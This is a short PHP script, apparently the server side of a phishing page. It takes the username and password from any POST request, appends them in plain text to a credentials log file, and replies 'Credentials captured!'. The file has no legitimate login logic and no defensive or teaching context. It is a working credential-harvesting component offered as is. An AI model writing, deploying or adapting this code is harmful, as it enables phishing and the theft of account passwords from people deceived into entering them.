<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log_file = '../logs/credentials.txt';
    $log_entry = "Username: $username, Password: $password\n";

    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

    echo "Credentials captured!";
} else {
    echo "Invalid request method.";
}
?>